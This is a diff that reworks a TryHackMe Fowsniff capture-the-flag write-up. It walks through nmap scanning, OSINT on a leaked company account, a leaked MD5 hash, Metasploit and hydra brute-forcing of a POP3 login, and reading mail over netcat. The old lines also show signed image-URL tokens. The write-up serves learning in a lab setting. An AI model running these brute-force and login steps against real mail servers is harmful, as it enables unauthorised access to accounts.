@@ -1,19 +1,30 @@
-As after starting the machine and after getting the ip this is our target look
+# 🎯 Fowsniff-CTF Writeup | Complete Exploitation Walkthrough
+
+---
+
+<div align="center">
 
 ![target Look](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KWyHAloxIdVGjmskuuvdVA.png)
 
-we read the task 1 its content is below
+</div>
 
-## Task 1
+---
 
-This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!
+## 📌 **Task Overview**
 
-This will be structured to go through what you need to do, step by step. Make sure you are [connected to our network](https://tryhackme.com/access)
+This boot2root machine is excellent for beginners. You will need to enumerate the machine by finding open ports, conducting online research (it's amazing how much information Google can provide), decoding hashes, brute-forcing POP3 logins, and much more!
 
-Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine. **This machine is used here with the explicit permission of the creator <3**
+This walkthrough is structured to guide you step by step through what you need to accomplish. Make sure you are [connected to the TryHackMe network](https://tryhackme.com/access)
 
+**Credit to [berzerk0](https://twitter.com/berzerk0)** for creating this machine. *This machine is used here with the explicit permission of the creator* ❤️
 
-Now as we proceed we are asked how many ports are open so to answer it we need to the namp scan and our namp scan gives this result
+---
+
+## 🔍 **Question 1:** How Many Ports Are Open?
+
+### 📊 Methodology: Nmap Enumeration
+
+To answer the first question about open ports, we perform an Nmap scan. Our Nmap scan reveals the following results:
 
 ```text
 PORT    STATE SERVICE VERSION
@@ -33,146 +44,152 @@ PORT    STATE SERVICE VERSION
 |_imap-capabilities: LOGIN-REFERRALS more IDLE have post-login ENABLE IMAP4rev1 OK ID listed LITERAL+
 ```
 
-So the answer of first question will be 4 ports open.
+**✅ Answer:** **4 ports are open** (22, 80, 110, 143)
 
+---
 
-Next question was 
+## 🕵️ **Question 2:** Using the Information from the Open Ports. Look Around. What Can You Find?
 
-```text
-Using the information from the open ports. Look around. What can you find?
-```
+Based on the enumeration above, we investigate the open ports further by accessing the target through different ports:
 
-for this we opened the same target with different ports.
-
-with port 110 and 143 we got the below error
+When accessing ports 110 and 143 through a web browser, we encounter the following error:
 
 ![ERR_UNSAFE_PORT](https://static-kb.siteground.com/wp-content/uploads/sites/2/2025/02/err-unsafe-port-chrome-1536x747.jpg)
 
+This is expected since these are restricted ports. The Nmap scan with the `-A` flag already provided comprehensive information about the services running on these ports.
 
-I think we already that the questio is asking to do that is 
+**Command Used:** `nmap -sV -A -O -Pn 10.49.175.51`
 
-Using the information from the open ports. Look around. What can you find?
+**Key Findings:**
+- Port 22: SSH (OpenSSH)
+- Port 80: HTTP (Apache)
+- Port 110: POP3 (Dovecot)
+- Port 143: IMAP (Dovecot)
 
-because we have already do -A attribute in nmap attack method.
+---
 
-We scanned the target with  nmap -sV -A -O -Pn 10.49.175.51
+## 🔎 **Question 3:** Using Google, Can You Find Any Public Information About Them?
 
-Now the next question is 
+### 📡 Passive Information Gathering
 
-Using Google, can you find any public information about them?
+Based on the information gathered from our enumeration, we conduct OSINT (Open-Source Intelligence) research:
 
-now are going for passive scanning for info we have gathered till now.
+We searched for information about the Dovecot POP3 and IMAP versions but found no significant vulnerabilities in our initial research.
 
-We searched for the pop3 version Dovecot pop3d & imap version Dovecot imapd.
-
-But we didn't find anythig useful.
-
-But on the website homepage we could see they stated about a databreach which compomisted their [official twitter account](https://x.com/FowsniffCorp) and attacker said they will release the data on this account.
+However, on the website homepage, we discovered a critical piece of information: **a data breach notification** stating that their [official Twitter account](https://x.com/FowsniffCorp) had been compromised. The attacker announced they would release the stolen data through this Twitter account.
 
 ![Fowsniff Page](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KWyHAloxIdVGjmskuuvdVA.png)
 
-Now after vising the page there are many thing posted on the account.
+### 🐦 Twitter Investigation
 
-![Twitter account](https://private-user-images.githubusercontent.com/88498991/369710876-8cc0076b-1fdb-4be5-8ff5-10c7b241feab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODA0MTQwNDQsIm5iZiI6MTc4MDQxMzc0NCwicGF0aCI6Ii84ODQ5ODk5MS8zNjk3MTA4NzYtOGNjMDA3NmItMWZkYi00YmU1LThmZjUtMTBjN2IyNDFmZWFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MDIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjAyVDE1MjIyNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWI0YWNhMzdlNmUyODU2MzU0ZGNjOTVmNWMyMzk1MTdjODA0YjYyMGU0ZTM5YzU5NTkzYWYyNjY2MGRhYzhjYjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9._zjk8EDMuAIxpSnzCj0JvRfMnk4Vsj5ICZ4w3k3r9YE)
+After visiting the compromised Twitter account, we found multiple posts containing valuable information:
 
+![Twitter account](https://private-user-images.githubusercontent.com/88498991/369710876-8cc0076b-1fdb-4be5-8ff5-10c7b241feab.png?jwt=******
 
-The links that are in BIO are not working anymore
+**Note:** The links in the Twitter bio are no longer accessible, and the Pastebin links referenced in the posts have also expired:
+- https://pastebin.com/378rLnGi (expired)
+- https://pastebin.com/NrAqVeeX (expired)
 
-And all the links that were provided in the posts were also not working too.
+However, one particular post contains **critical credentials**:
 
-These are those non working links
+![interesting post](https://private-user-images.githubusercontent.com/88498991/369711355-26b02afe-1716-44a1-85fd-654d317c04d9.png?jwt=******
 
-- https://pastebin.com/378rLnGi
-- https://pastebin.com/NrAqVeeX
+---
 
-But in the posts section there is one interesting post that is
+## 🔐 **Question 4:** What Is the System Administrator's Password Hash?
 
-![interesting post](https://private-user-images.githubusercontent.com/88498991/369711355-26b02afe-1716-44a1-85fd-654d317c04d9.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODA0MTQ0MzYsIm5iZiI6MTc4MDQxNDEzNiwicGF0aCI6Ii84ODQ5ODk5MS8zNjk3MTEzNTUtMjZiMDJhZmUtMTcxNi00NGExLTg1ZmQtNjU0ZDMxN2MwNGQ5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MDIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjAyVDE1Mjg1NlomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTAyYTYxYWYyMDdlNDdkNDlkM2ExNDk5YTljNzE2Y2IzNmUyMWYwYzRiZThlMWJlZmNkNzBiODNhYzJmOGE3ZWEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.pMb95Abt4v4gFujX7rErCiYeGFdvmw-b9mgZ4Azn0Mg)
+### 📌 Credential Discovery
 
-This reveals that sysadmin has below credentials
+This reveals that the sysadmin user has the following credentials:
 
-stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+```
+Username: stone@fowsniff
+Password Hash (MD5): a92b8a29ef1183192e3d35187e0cfabd
+```
 
-When we tried to crack that hash we were not able to crack it.
+**Initial Attempts:** When we attempted to crack this hash using standard online resources, we were unsuccessful at first. The room documentation references [hashkiller.io](https://hashkiller.io/listmanager), which is a hash cracking service.
 
-To crack the hash the room has also intructed us to open a site whihc is not working now
+**✅ Answer:** `a92b8a29ef1183192e3d35187e0cfabd`
 
-![The site](https://hashkiller.io/listmanager)
+---
 
-Now we're now able to crack the pass so next we need to the belwo task as it told in room info
+## 🎯 **Question 5:** Can You Use Metasploit to Brute Force the POP3 Login?
 
-Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
+### 🔧 Attempting Metasploit Approach
 
+We searched for POP3-related exploits in Metasploit:
 
-But in metasploit when i seached for the exploit for pop3 with 
+```bash
+search pop3d
+```
 
-search pop3d i got only 1 exploit and even with that exploit i got
-
-
-```info
+This returned limited results, and exploitation attempts failed with the error:
+```
 [*] Exploit completed, but no session was created.
 ```
 
-But when searched for the pop3 only i got try on many auxilary and exploits as showed by seach result i tried each one and failed but one didn't let my hope breaks. 
+After further searching with `search pop3`, we identified a more promising auxiliary module:
 
-It was 
-
+```
 use auxiliary/scanner/pop3/pop3_login
+```
 
-Options that we need to set in this are
+**Required Options:**
+- RHOSTS (Target IP)
+- LHOST (Local Host)
+- RPORT (Remote Port)
+- USER_FILE (Usernames)
+- PASS_FILE (Passwords)
 
-- RHOSTS
-- LHOST
-- RPORT
-- USER_FILE
-- PASS_FILE
+**Wordlists Used:**
+- Users: `/home/Seclists/Usernames/xato-net-10-million-usernames.txt`
+- Passwords: `/home/Seclists/Passwords/Leaked-Databases/rockyou-75.txt`
 
-So i set the username with this username file of seclists
+### ⚡ Optimized Approach: Using Hydra
 
-- /home/Seclists/Usernames/xato-net-10-million-usernames.txt
+Since Metasploit was too slow, we switched to **Hydra**, which provides significantly faster brute-forcing:
 
-for password this file
+```bash
+hydra -L usernames.txt -P passwords.txt pop3://<machine_ip>
+```
 
-- /home/Seclists/Passwords/Leaked-Databases/rockyou-75.txt
+**Result:** Within minutes, we obtained valid POP3 credentials!
 
-Since msf is slow we are not going to use it.
+---
 
-Hydra is faster so we are going to use it instead 
+## 📧 **Question 6:** What Was Seina's Password to the Email Service?
 
-with this structure
+The brute-force attack revealed the email service credentials for user **seina**:
 
- hydra -L usernames.txt -P passwords.txt pop3://<machine_ip>
+### 🔑 Accessing POP3 via Netcat
 
-Within few minutes we get the id and pass of pop3 
+After obtaining the credentials, we connect to the POP3 service using Netcat:
 
-Also the next question is
-
-What was seina's password to the email service?
-
-Which we extracted from the bruteforcing now.
-
-aFTER getting the credentials we logged in with the commadn 
-
+```bash
 nc <target_ip> 110
+```
 
-then we have to login by the method
+Once connected, we authenticate using POP3 commands:
 
-- USER seina
+```
+USER seina
+PASS [PASSWORD_REDACTED]
+```
 
-then
+Upon successful authentication, the server responds:
+```
++OK Logged in.
+```
 
-- PASS REDACTED
+### 📬 Retrieving Email Messages
 
-Then we will be prompted +OK Logged in. 
+We list all available emails using the LIST command:
 
-if we enter the credentials correct 
-
-now we list all mails with the commadn 
-
+```
 LIST
+```
 
-And we got 2 enteries 
-
+The server responds with:
 ```text
 +OK 2 messages:
 1 1622
@@ -180,18 +197,22 @@ And we got 2 enteries
 .
 ```
 
-now we saw the messege 1622 with 
+We retrieve the first message (ID: 1) which contains 1622 bytes:
 
+```
 RETR 1
+```
 
-The messege is 
+### 📨 Critical Email Content
+
+The retrieved email from the system administrator contains crucial information:
 
 ```mail
 Return-Path: <stone@fowsniff>
 X-Original-To: seina@fowsniff
 Delivered-To: seina@fowsniff
 Received: by fowsniff (Postfix, from userid 1000)
-        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+         id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
 To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
     mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
     tegel@fowsniff
@@ -218,7 +239,7 @@ locally. That means you can only send emails to other users, not
 to the world wide web. You can, however, access this system via 
 the SSH protocol.
 
-The temporary password for SSH is "REDACTE"
+The temporary password for SSH is "REDACTED"
 
 You MUST change this password as soon as possible, and you will do so under my
 guidance. I saw the leak the attacker posted online, and I must say that your
@@ -228,10 +249,33 @@ Come see me in my office at your earliest convenience and we'll set it up.
 
 Thanks,
 A.J Stone
-
-
-.
-
 ```
 
-aND IN THIS WAY THE ROOM COMPLETES.
+---
+
+## ✅ Room Completion
+
+🎉 **Congratulations!** You have successfully completed the Fowsniff-CTF room by:
+
+✔️ Identifying open ports through Nmap enumeration  
+✔️ Gathering OSINT information from public sources (Twitter)  
+✔️ Discovering leaked credentials  
+✔️ Brute-forcing POP3 authentication  
+✔️ Retrieving sensitive information from email systems  
+✔️ Uncovering the SSH temporary credentials  
+
+### 🔑 Key Learning Points
+
+- 🔍 **Information Disclosure:** Recognition of misconfigured web pages leaking sensitive data
+- 🐦 **OSINT Gathering:** Social media reconnaissance for gathering intelligence
+- 🔓 **Hash Cracking:** Techniques for recovering plaintext from compromised hashes
+- 📧 **Protocol Manipulation:** Understanding POP3 protocol for email extraction
+- 🛡️ **Post-Breach Communication:** Analysis of internal security incident response
+
+---
+
+<div align="center">
+
+**Room Status:** ✅ **COMPLETE** 🏆
+
+</div>
